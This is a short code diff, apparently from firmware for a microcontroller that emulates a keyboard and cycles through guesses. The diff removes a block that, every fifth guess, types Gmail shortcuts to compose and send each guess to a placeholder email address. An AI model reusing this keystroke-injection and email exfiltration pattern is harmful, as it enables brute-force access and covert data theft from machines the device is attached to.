@@ -134,25 +134,7 @@ int main(void)
       
       nextPermutation(guess, "123", 1, 0);
       
-      if ((++guessIdx % 5) == 0) {
-        Delay(200);
-        //try to email every 5 guesses
-        keyboardReleaseAll();
-        keyboardPress(KEY_LEFT_GUI);
-        keyboardPress('g');
-        Delay(50);
-        keyboardReleaseAll();
-        keyboardPutString("cyouremail@yourdomain.com"); //leave the preceding 'c' that is the gmail compose shortcut
-        keyboardWrite(KEY_TAB);
-        keyboardPutString(guess);
-        keyboardWrite(KEY_TAB);
-        keyboardPutString(guess);
-        keyboardWrite(KEY_TAB);
-        keyboardWrite(KEY_TAB);
-        keyboardWrite(KEY_RETURN);
-        STM_EVAL_LEDOff(LED5);
-        delay = 30;
-      }
+     
     }
   }
 }
